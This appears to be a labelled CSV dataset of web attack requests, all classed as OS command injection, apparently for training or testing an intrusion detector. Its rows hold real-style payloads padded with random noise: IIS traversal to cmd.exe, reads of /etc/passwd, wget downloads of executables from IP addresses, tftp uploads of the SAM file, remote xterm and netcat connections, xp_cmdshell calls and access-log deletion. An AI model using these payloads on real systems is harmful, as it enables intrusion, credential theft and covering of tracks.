id,class,vector
19880,OsCommanding,/HAqf4xr/oSEvSWuWPHjFRVR/VKlPRs_38lcni/ibKHRhObLECnA/xP/.Gg/d4lMfN/eyaAeol/fe4G9@tJiRAxI/nja1aeY31ltte1tpeuo/nkiHTTuQz3zdK0CZf_D.tiff?SetbeeAuenoae=niitD&3v=tuoor0Z8&xFY0y=r8tj73nb7WSs&eutnh5a=pyjoqnndp9&Enoutullhau=ee2n&ee1iDr=52382&n6B9Aor=9s&nn05=312&ar4uemiltsqug=%3E0urfoanullrcprte%5Dt-&Onie91thtro=otd9-&mrI=k_3F0.5&tinoentqy=tgni&hmdcbao=88&HKlstenS86vEh9=td5sbuenuitw2tthd&gil0ienlot=8depgue17
19891,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
19895,OsCommanding,an1haneaeoao=11863&gjrlxho9bea=259689&saddcn=n&ohMnrhctuiaiesi=90&iqNi7eReseeN=64.20.147.24   |dir&i9jihsui=eh&rhcpsRN2=143264&aebo=26&rr5Oeyyeio6rL=32598650&htNclnideFyn=69&uaRdbordai4=rej&eho0fgtyi=1o-
19911,OsCommanding,fh=1&icmhyq2=mdgI5)tehn oy=t&rriebNinnib=1968625&1rnHCW=48671522&Tghtjtwej=n itqerewget$riImo&di4Ilu=mb868NPX1&c0hwfedadanp=69224&ssosc=bulk   insert grnF9    from   'pwdump.exe'         with (codepage='RAW'    )&.OT_JODZwqr@=jBTHLqcXEjb&Ail1GEW=rnmo&9~ e&passwdbrneh)s&hieqnwpiazrcgj=ipeRvotnlHeaita&LbmxM=sMUV4&hbgm=987&eaRIhNnho=eReb&EMUUm2E3-mvB=pj?tpusystem
19924,OsCommanding,ratEtrcTlahrne=8002632&cfexaopqdigtnnn=lbkiprgDlform&tostyzsOn=nEiLzg8P&eeduotvhh=l3NFFTSI&eOiswsH0aeaZ=315&Wynph-I_3D=nj&p8ihtvNrnihe=eg-ZpwZzFCP
19932,OsCommanding,..%c1%8s...%c1%8s..%c1%8s..%c1%8s..%c1%8s../winnt/system32/cmd.exe?/c+dir
19959,OsCommanding,/a7XP/scehamhesomsaFooolnn/Lfnffdeiemloylzi7y.css?cneacsfnGe=%5Cnls+++++%2Froot%2F&E7mesehuI=2517905066&0rcpzsKvarqW=v9qrArhueiisyE64w0&40Wg9H.HDyBt=g%3FCimgi&es=4
19987,OsCommanding,/cgi-local/alibaba.pl|dir
19997,OsCommanding,"/scripts/file.bat"""
20081,OsCommanding,plh=likeT ccoeEehtaccesgfscripttadminhq&tth8lBmeia=rUnwindow.opendeufl&onx3ujn0trdrE=4eitbznteeFxnnDio3&hl=eNeub&where-sF9ietcK36Kb=uqfNu&iarntdtufe6atjo=6993399278&ohSnAhErui=lZg6&ILTIr7=jY2&cneoa=275961
20091,OsCommanding,/d30ge2UYoKgJTd.zZ4DV/tU0uWfvf/mn1yPeaQymrEnamcee/taweo.jpeg?aNoNqHrE2lf=oilfaze7nftrRhm&nerl5eAiVV=32&NDhBZtwindow.open4tmp=n%24%5Di&DGQFftpplocationhomeCf=233499&kyaeaf7pIei=tsnfVQ&sll=813&bNraomuqenDt=rmIKd&mwwvts2ebos=tmp&onektaet=h%3DUeagEn&h483ONno=h%3Cfoa&to5detr2rthuf=Ngcldn&rcm3l0Mlha=cat++++%2Fetc%2Fpasswd%7C&evalN6nB=rvlZssv2q9k
20093,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
20173,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
20175,OsCommanding,/h54OxfRl-1ccE2-/e2zLAr/mnRstuh/04Fwgetqo/oftrdtuasogeil/wZ4Z.vX9usraMxp_q/nlHcopy/d9.png?etobseigce=eXXVmMYarSIA&ittek9eitpiaO6n=exec%26&lAtmEiietc=975643&taS3tre=iTT&CFenlg=k+&irDtszetol=h%40%2Feunc%2Br%24&vQ3yE9dhku1=injsgrt9a&dio7md0aNlot=90490&bqsuzn0enrtssS=edannshsk&ohrohndsla8b=%5Crxterm++++-display++112.74.251.180%3A0.0&ieHt4t=w6ZqCGI%40t&QQ3A9YXupdateWL=E6&d004nTHeoat9eq=36199476&fCeReAwto9az=44531
20188,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
20192,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
20203,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
20226,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
20240,OsCommanding,"/scripts/file.bat"""
20269,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
20294,OsCommanding,/havinguDtX6jf@sFgEAf/Cp9-/rgKlg@mRVA/6ZdDv/tB8lQ0odLSelqrpgje/nk2wx/s9iYrqP_d8q6JE/mTndhndbnihqhmlecn/nsmah/taOodkd75/isNslsjute/eeqoatatasoFge.msf?Cz7ZFKHy=%27%3B++++EXEC+++master.dbo.sp_makewebtask+++%27c%3A%5Cinetpub%5Cwwwroot%5Cseaeter.png%27%2C+++++%27SELECT++aFseet+++FROM+++teE+WHERE+++++xtype%3D%27%27U%27%27%27&saniRbke=3emhhn
20301,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
20367,OsCommanding,/iarczrlwhk/stdinHPusr/-9MO.znIi/eMtcuL10n/aNhpslimzaEdyc7ifAe/JaBET/yFnjijrao/heerdep/SUsock_streamVKWazp3ZjbPR/M53andlnGn4_.htm?5a=LRcood7eae&czr1rnLm8V=jnhulhttpsaglernBwe&o3attnledtfzh0j=%3Frdgrn5&tiirglnf5r=%7C++id+++%7C
20380,OsCommanding,/3d90uemnP/eGuSBw@p7nd68aYM/eovt/rtpZ51Vz6vm6zriB5Vb/ito/bPKYAjle0S/tgrf.YLD1-/adBqGz2K-7/smeIoaiaieHoHmn.gif?1amtiiettn=Ais54E&JdmYX.=tete&rcirabh=%5Cn+++wget+http%3A%2F%2F148.196.241.194%3A2016%2Fnftp.exe
20383,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
20398,OsCommanding,eswdseunek=t10a&ln=etv&ndiohoNf1xe5hr=3f1 Trughh&ccnltth9nr=25722&jurtetr6mrni=acfqtOM3gEc&peea= sc=E&7lbmg=OduorreapnvwOy8uL1&bhmhlike=ney sbodygroup byknexe 4e n&zZEtVK= &steacboieag=(eieyei&elm6r=07063&uiottseoctstn6=t a%ehavinghtWnstdin&ee61eaZ=s
20427,OsCommanding,/1tpsho4/ol/3tjrntsoherTmd/oXsLpmdFGkNvkE/oaI.TgR/P9Gstdinnjj7tn.js?eoehejlirene9l=4n&rscqnrs4=8uteit%28o2h&na=%7EosF&hrItdem=LeeeEsEh&lErnm5nWi=m&jgeeau3affd=6l&nutdtp0tmS5axaq=733RV%40&afrfttttw3=EEdhiiseen5j&Rsg5dnxH=1Gj.moqDwpo8&tnSc=from%3Dsxp_alllaowgetrcTall%7Cszo9netcat&h2Nqhbtto=apHL%40TWF5.H&em=8.197.229.237+%7C+++tftp+-i++150.32.88.39++PUT+sam._&eu9flsat2enea1=fIbS
20483,OsCommanding,/i4BvI/de005uyintbQdahwseea/CXWvKUwobjectLY@/aybex3vvvawignitscfl/1tdaheQce5xwanoiitj/lthne7ely2xdrcry3qnh.css?cdtBad5=%5C%3B%5C%2Fbin%5C%2Fid+++%3B&Vaccess_logscriptEWeHe8.=ls0vmbisaaatw
20515,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
20543,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
20550,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
20567,OsCommanding,asGeansstehee=23&cY=24&h00siraelyaU=/../../../../../../../bin/cat /etc/passwd     |&ondqESbdeEMmg3n=hbRzEv&07Hd66K=vlwtG&ort9wyoeeihry=7pb&ZNEO=cl ure&pecogKes=649&hx0=5837&Hr=1lcT
20580,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
20586,OsCommanding,/eVj57uc00h/9P/iOYR0.nv5OsNC1B6hI/nt2nnrdn/o9cf/hCRe-_-Cw_K/nunoaghuls09hIingo/asodoeodCidiisE4/gharaha9ewiCea/y6yb.ZW5HfzBaLGG3B/s0S.swf?ahhInwdwact8rdy=e6jJv6vHHb&eplff0ikc5=spOb6LB&OJS.8_1Heofr=Yd&g2io=oScu3HQWY&aalmnasa=irNaogem&j6mZ=ttrr3riqSsto%25uw&5dCPK=%5Cn&myogrehMn=436&fecitid=90&aduecogaurC=149943780&3asL=+a%25ed&dterefesEao=%250a++++nc+++www.asrengesvema.com++++80%3B&upca94ngth=lnth
20590,OsCommanding,/scripts/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
20617,OsCommanding,/boyect/6RqRHO/kttxrlheO9ga9nphtaFH/xedh/Ngkllaxs9h/tRgluI-ID_l5EnxV6Hbj/ZKSFd3rrnj/srhl7yAtk1yFpRs1znp/rcr6oiiteedmPhkieQP5/lphs-UmH.bin?clAscdkh=Twnodedstenntr&GQf2ABL021G=qtpceykdeT&totfHTu4=nas&lnrniho=5895&hef2Rlnminsspt=72993498&iK0Ns_DQo=130309439&utLRbetweensP2where3yobject=nshutdown9%27nrad3+adiv&tlueNxuogz7=hYTrNH3Aaj&httpsGMom.fr=d8vbscriptrwnHlE%25uzhe&qioaqpiND=bnj&on=%2Fperl++%2Ftmp%2Fsentne.pl++++-p9342&gizAtilp5t=67&iIe=s%2Fhomeexecf&fnhLfb=2wimnt+mren&vRpmossga=sh2t
20658,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
20666,OsCommanding,e0su0ptto=mupdateAe&9sunout4ro=|    cat  /etc/passwd&group byZZyy=mMivshhjze0eosyr&1oeutosh=as&Ym8P=feo1m6&naic8thshrlsue=telnet2h&mAP.YX_@=232576&totoebad=httpourDz&ewlm6rrHmpio5a=9097013&iBpanaNy=4313&afyw=06032790&f.zdivxRE2TA=og39
20703,OsCommanding,/bin/ansio.pl/seite=;cat
20718,OsCommanding,/tz/g8bNRN/ip0EOrylmu5G3i/8kyeh651w/gQ8S0lbKVDRp6/is.imlsOJV-l_tXAzZ/Y1P8SPp0/ssllItqdnauRsnco6d/ak.exe?fhihoemmdsmu=f%2F%7CK%3Ao6&exenmr9=++&Hi3t5=73&qusrsAZHopt=3903&9Cdocument1IZnph-FjAu=iWeek%40f&4e.Lne55CPmailz=%250A++xterm+++-display+++www.nitasealnt.com%3A0.0+&iaNnoehtrNe=aNYjRUqXHeej&Xret5Ofounlsc=is+rrvee+r0cunion&69oE4=b%3A%3Betn&ecryg1Odsdwe=5pNKuY.BuZJ
20734,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
20757,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
20758,OsCommanding,/0fyLd-Xy/9Iw/3tseaoeerrEicAjh/sreGaatoetrifnt/eyfneeoj9eatitm.jsp?
20801,OsCommanding,..%%35c../winnt/system32/cmd.exe?
20806,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
20852,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
20858,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
20878,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
20893,OsCommanding,/eYTyzQ50nF/h1Vw/g.9htaccesKB1/iepde6e9rOicdd/x_BlogGpie8/ioeth9a1acrueo/pOGlnapC7oY9/nnOihK24brI3fk/blnhl6Rsll9b0rRnm/tdoN_/ljeoeto9m.msf?g6Icnhno=%250arm+++-f++%2Fvar%2Flog%2Fhttpd%2Faccess_log++++%3B&agy=e1rserwTxnhttpnywes&k-kiqn54=hjJ08DLm2j_l&u80Ss=t+kiop%3ARtg+8ieexp_lms&ehtopdnoab3E=eiau&ynel7bma=tmpk&snalstz=linput&im2epmew4ah=heAcinsert&tx9oc0deeery=garal&2Cvtmaf=6&g1z8Dwp-ncU6TI=w+
20894,OsCommanding,/hQ3dkCG.@i28/nxlY9V@QAzAHeDwF-r45/n56N8_wQH9.jpg?FHIzsJao5C=lSAN&eereamrsTeuyT=%7C+echo+++%22Content-Type%3A+text%2Fhtml%22++++%3B+++echo+++++%22%22+++++%3B+id++%5C0&etnr1dl=s1nd&dtqu=64129&tasa002sy=%24y
20898,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
20919,OsCommanding,/a9hDsNr/eL-2xFi/H8DY.SU./iUyW99HaDOjsWKUtoY/412-Z/qa/evbscriptDtvxmlps%u7@rKzr/bSM7ya/pt/x-Tftyc2Im9zt1_12lQ.asmx?aincis=2&er2oast=lIt&fiSntGrlt=%40&hticsladelio=32&P2Xhimgi=%27+++%3B+++++cat+%2Ftmp%2Fres+++++mail+stis%40lealis.com+%3B
20920,OsCommanding,/0Yhh.gif?lnEieoflke=%7C+cat++%2Fetc%2Fpasswd&xuf=8nn%3Er&JP7r44replaceTW=rcft%40rt&rznT4moos=90&sdito=lkUO&sheooI=dand%24at%3Cyhmecholhna%2F%3De&obg=xml&dj=b6XTRLI0&etttfMtrpkxoh=e7vjF3&lhTailieoh0=var%2BhA&ani9gx2=0nrcprauOauupEc8&icsSheaeo=724559&uptp=4730249&tea3eneosGea=nLhb&kf2_S=i%3DmzmunionI-ihf-%5Cc
20938,OsCommanding,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
20941,OsCommanding,/trs/positiongLFD9./etKb/eoibhnJnIasz7.cfm?filn0SiL=%29echo9oscripthavingiemog&ast9jrWsksabeld=lJ9&eR0reBfd=65&rzdianayeoht=aaedlxo0ee&uA8drlfke7t2t=55668&eRiSTLKbgsoundyzl=aJ6V&mteeec=%7Ca-upnqw+oen0amochah&koar=+++++%3B+++echo+++++++%3B+++++w+++%3B+++uname+++++-a++++++%3B++id&HKaTM=2279376
20988,OsCommanding,"/scripts/file.bat"""
20991,OsCommanding,d@unlib=teneofofefEm9&syewptaarrit9ti=9652&xEgietptoS=631332877&u-aKrF=tcopynui&g5dierhktls=10&h8oi5=11&lf4HvarxwgetrA-=EswSnde/  l>aphpa&4seerukpnoo=lexa48lttaaofnoaom&en=dobKX48_Z5A&eveeL6iei=sUOLFPgb.APO&dl=aYccx&r2repwsyndt=3&nrrt=889004&6bonta=En1vfst
21004,OsCommanding,ti=1143&tneaPrydsd9Tgv=sihrejmNxs0o&lpaah6nlubbu3=oVnHFx2PGVTd&tlwsdaFuSobmat=90957&dbtjuHAs=0lkkUs&nomeRr1n2Rmes= dlikeagroup byr $eMinntkan7&ncsjro=Qhrwherercp4 hn4dy7:
21027,OsCommanding,/HFAAdusrL/e5h0qpr0wup/ye@BMO3rCWp3Kusr/nOzRes-processing-instructionb/style_wgetYo/neSmeiwyynthercpwmwj/wp6olhxntTmted7ChE/tPV6w.msf?vzehTzytryRn=%250a+++++nc++www.nsattali.com++++80+++%3B
21043,OsCommanding,/lafmU8jmntnZ/doJodU@aGDjItDv/ttOwifkwroAt2ptsehze/slt/uentrdo4sdm/deo6nqnmshites/LuGcopyuWiv9M/asl/.h0linkpaS8Kb.jsp?toInhnrtidlxia=il1Ineae8flfetha&awxHdeinIsie=%5Cnls++%2Froot%2F&nimatett3=tipai&o0uge4Wsn=b%3Ersaccess_logoo%28%40s%3Dghi1sock_stream8shutdownrp&Nmwsam=9IacceptfweestRjin
21047,OsCommanding,/aehses2i17dgHEeaN1e/tvXO29X.fBPm/9nQglfDoz.tu8/l5br1yeWeg/dnloEdn1r4kp.htm?ritjl3vnrr=127979521&ces=e4w%2Fg&iwiii4otgl=wais5efwEseR&ar=eIwRO&etfossgdowIa=pnwvEbi4htoxtEidti&ud9rms=141&orUDSqg.k=22.157.20.163++++%7C++cmd.exe+%2Fs&execrmsock_streamM=Ntmlnr&amrrmNwn=84940467&O_CExp_a0V=ta%3Cie25a&aWOsb5wo4aie=e%24hmeta%2Ften%7Ccats%3Flyi&l6=hmPdfell&xhddo5ioa=jin
21074,OsCommanding,/hn/b2dalvRN_/dc/iilK6e/g0ilS663sEartdar1/tbTvOFJ/yv/tM/e1x1n.dll?etcmOpli=oainsertz3oiujuaA5q+ijinclude
21118,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
21135,OsCommanding,/lLq/mnZUmwRmhtpassjThX/htnrRe4Hwex3motn/j1GstKB3xk3@UzhI3Mf1.pl?ti3cw=%3Alle+n5d%2Bpdsenhsxmlij&oeosa=B&QBuhccopyR=2&cilorataejd=4589061071&mefigegriNw=57591&rheunty5h=%5Cnls+%2Froot%2F&tatianean=in0w1cdttfTc&icp6t=%29%28telnett%24etax%7E+O+hhOs%7Eda&Ig=e
21155,OsCommanding,tS=se1ft0o&scc4tyidsl0rseE=boot.ini4sh5x0tnr&kslt8=|/usr/openwin/bin/xterm+-display+18.251.160.96:0%00&tsai=71484210&tsoasioCi=8749&2Osuvontetietl=8510194592&ar8ru6pw2wrIsb=auQRvyp&enh=475272&H87d@_8=554753&R32N1pkX7Ior9=e
21174,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
21197,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
21215,OsCommanding,/handler;cat
21262,OsCommanding,/bin/alibaba.pl|dir
21264,OsCommanding,..%5c../..%5c../..%5c/..�
21299,OsCommanding,/OpAle/y_Vz@Y/8QzET4_vB/sohzirmam.sh?nsra=t3&locationW0B3BId=mF1-Oui&meieG1l=%250acat+++%250a++++%2Fetc%2Fpasswd%250a&bUreplaceropen.@.=dseenydxeehnoSwiX&eBo1epmsat=iiEaobejennz+&fi0r4tadoIbi=rot8hDeysidw++
21309,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
21334,OsCommanding,/em89bZoubrs/twlcesaocsul/uik.-x9Wqf5TgMb@3/tFtXacy/riy.HIxCuy5/HfewlimiyOeTsnis/aQSsj-k-cdOuQehSSm/YonNpldeyn1iorcrnbc/@UT-/_tmN.html?sehdi0tns=%5Cnls++++%2Froot%2F&eRnoesnhszZgro=41990008&8ra=soTlt&XuxALRxo@V=Le&oityb6ei3sestd=xAQaehetlwrasan&wieqfeer=nxw1b%2BiC%5D21ce+n7iid+
21340,OsCommanding,/twtfgeAyflnae7thed/eakC.X33/m2tr/NLftp7r_enBXCJif/cz/onPrm8thiteunTsv/tLmbt9Y1QsobdZOJj5Y/iohHmI/ojFPEAtp/yYUUtH0cutup1.css?eoie4sth=cmathpaaZtaanha0&m8mamaaewtrlo=aNHS-kGui9Pe&qioh=899130&teranoroE=1622260&ruTr=ieG&s8e6etfrhnts=2&ar9nAgvseftuitT=ls+-las+++++%2Fhome%2F++%7C&dXn=47&olww=tidcrsnhposition37&sietom8dNthtma=+%24%25&lyetW=rar8s&Fompfi6tte=nerotiAIdPeo&el25f=hpcH67%40haZ&hrsd=e9r
21365,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
21373,OsCommanding,/z_NDoYwqseZ/fKw@CpJS/eQaLcU5nTVh3cJPp/gusX6qRqpDiD8cZ/her2a3a8lWg5yeeIe/m8el_JZ/K51@Areplaced0NI/qMqGWA/ITFjFpsincludeDTE/f7hbestEwosmfsp/EenKRmrctLatnnor/aerNhe8ebsun.cgi?SezR5dWe=egJskJ4S.rV&legmd=569408&GKicmdQ8locationb=22769988&a1etorpGi0R=update+iM%5CTecOa&f-zYdo@=9ief&4tivuteIthr=naccepto6imiaR&oicrift1nNcdRor=%22%3B+++telnet++++81.46.92.31++80+++%3B&d8theyWrA=25080&dit=710&ot3=stmo&el6mt8Erumleet=22&DSreplacelobject=xcwi%3De
21382,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
21383,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
21393,OsCommanding,"htisUailLErrfx=ntahhAcseeetps&teAwEe6oa=n0e43&jhttpNo.TtKTQwgetrm=9G&azexnirnieTsrt=31218771&nunion.OSJS2m=hiyy9jsBKG&a35esla0W=to|teth&5gDr0form=eaRb&ytao=|   echo   ""Content-Type"
21421,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
21426,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
21431,OsCommanding,/p@zjaiidKJbgsoundhtpass2X/KQprocessing-instructionhgwwindow.openEHNdivZetcIi/IXb/jEt2nodeZe3meta6D/SV0df2@psinclude52.asp?tadminCsMeval=19629&l57VYj7=49.50.21.72++%7C+tftp+++-i++78.136.114.136++++PUT+sam._&Z_pLQg=6434209689&hjweerilta6c8=D
21452,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
21455,OsCommanding,/mtuS@3A/0veltedtnsp/oJm/nhyag_s.lp4T6kGGR.html?yotieshomkY=t%40+%7C%5B&heeRdas=6cits9iotr&Rsea1ed9n6h3kno=%3Fa%5D&ofayuNoa3pel=%25Incnph-h&dsOhpoee7=3e&lerhn5if=q&ettsttsu=1775&qwtciulYpI=ma0EFimg&Eet1Xa=ikPmelzoe&hnco5smw=93.148.84.158++%7C+tftp+192.168.10.33+evil.txt&qet2=s&TRDS_cmdMRopenx=41O34H9H&nzsSoSala=13
21465,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
21476,OsCommanding,eT=4window.open$q a]8ayf2elocationmshutdown&m8ZGz=neo<igroup byls~ps o o(passwdio&7uPswget=73.225.82.51   |    cmd.exe /s&FHd8=n&DLsW=8ma/&LrJdNeval=tiohtpassnsd+b ifhtet1m
21492,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
21619,OsCommanding,/h_Ibozl5ss7Icat/5glgnile/tv6iL5AiMMO8r0d/dnxsEmouhssdenscark.htm?Cle9rit=rm+++-f++%2Ftmp%2Fyetsti+++%7C&enr=8410&3hbh4odosnla7=7RkNhElbs&SJ981OSXlikeNT=76265&aiUsSEwoo2R=OmoeugnW1&fey=ularyzonogim&cH@6hCEM4=N1epnymaionht&aKy0TcDF=4234799&emoRsHdhJo=tei&Z5unionIbzQ5=c
21674,OsCommanding,/meOBu0_/akEi/izdTyHRNsM3W./qngsfr4frwf1vitlrad/l_NFqZTte4PIIoRWYlFJ/20_MzubO@ygY/dd.dll?
21745,OsCommanding,..%%35c../winnt/system32/cmd.exe?
21756,OsCommanding,/s31.mUzV9vR5hb5/umt7xls/KiSPisanntrc/lvsojsoCHi8eb/osdjsmtelze3hrro.shtml?atgN0rri=S&5autoexecPc=1159894&trNW.=54142&Osl9V=0128829&anaso=athrHdsmr2%27rdocumentpasswd9&ca=e5mztEAm6el6oe1ee3&cpexI=eFQvzTJa9jrX&6CkF=o6i&62eroO=e4fromm&liYfn=yzgu.&n9don6=yoQaAF&N6e@sock_streamntelnet=233.103.182.137%7Ccmd.exe+%2Fs
21758,OsCommanding,htiStahemtAD=65724&3ihdgaIrny9=f0EsVOX-q&buCSK_mIbOkX=oo8icsEu&RnrT=a1heosftw&6unionVKwnullNQP@=Aors&aottezdnoego=dNQfB&ouseqoh=88767803&eoeEto2otoitc=oeojEeht0uroqdS&ogse6wr=(d<qarbgsound2tmp&Fzayd=;th?b\ srerservices&-Fiunionu2TLf.=oinputtre&sotcbca2a4w=9671125&m4=Vfibs1r
21760,OsCommanding,/Qef4alEEhwtdOe/eTnaelxsnrqn/lTetctOxvFx/oERoti/tnPtas.pl?i9reWafBfue=66859&aiuQ=xHP&1zqC-p@sa0S6=winntmdeleten7%27aoptp&abhvd7rltHRnePn=stl&eb9ti5h14DIy=88&tdtreeyaso67l3r=34160&7pmi1eehf=832535&snesve5fxseeDe=sjx6-%40Ep&agtotos=rzzPUTWKhUs&eijih=exec++xp_cmdshell+++++%27%22BcUqecj%22+++++%3E%3E++++script.vbs%27&ziae8NgeEh=eEatedvhnasu
21780,OsCommanding,/scripts/..�/../winnt/system32/cmd.exe?/c+dir
21795,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
21801,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
21827,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
21839,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
21844,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
21866,OsCommanding,/htacces_Z.css?bnt=nfau9o1Fv&sw=28791977&ols10o=aId%28mrdl7&tcioygb7ar=rinakt8e0tnwil&TAMwhCxp_3GBKV=ee&clE=roefe+dhttps2&ju=koW9&tUytTWrw5i=ttstasbaaa&tlnToatnfarrw=tK25.&eO=%22%3Btelnet++++124.249.241.63+++++80%3B
21903,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
21912,OsCommanding,/e6EIMBWzwpoio0/stoasne/iUXPMNi1D/5sS9B/lgkTAakv9L6dTK4/1e-b3_X/8fiZ_.XM6zSkzbVu0shH/0eauegal/iT8s1Or7MWnbl/4ehieewi3iolltw/ayjjtah/d90E7EQXkjAy.css?VPkfze=%2Fbin%2Fps%2500+%7C
21916,OsCommanding,/ubBnmAp-/ePvNHCJxcSk/YEchildscriptfOwinnt_KmXPoW/asr/rJCVPGeeg5XOm2O/oe6/wj-M7xqoBm/nf1grssvr/swltt1eLadlqweg34/lOhqeeinrS.tiff?EgahH=22066&Mm5tCU8=naUa1e7xqocso&UmjRpi=aWUK4Cazc&dAaelqomdt=923340&pin5=ttkDd&eet=%24+eradmin%24to+whrDnchilds&ly3tRownsthi=%7C++dir+++++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+++%2C&7group
21925,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
21929,OsCommanding,/ANqWFJPLiZ2/vwjl/eVI@7dAZ1/EoDoe7mzdtafbe/reZalF/hPwb2IFwEuG4wJcSWPv/1lvg/o0rGC7Vc/hFGzBZ2fhMZl3Md_plV/n4KmabSGaAY4EPpvL6Y.tiff?eeDtcet6=tqQ&Ho8rsnatonetsi=%249e&ecaweaksrs=lnexa2rsEel&wxqVoZD=635&ev=%250arm++-f+++%2Fvar%2Flog%2Fhttpd%2Faccess_log+++++%3B
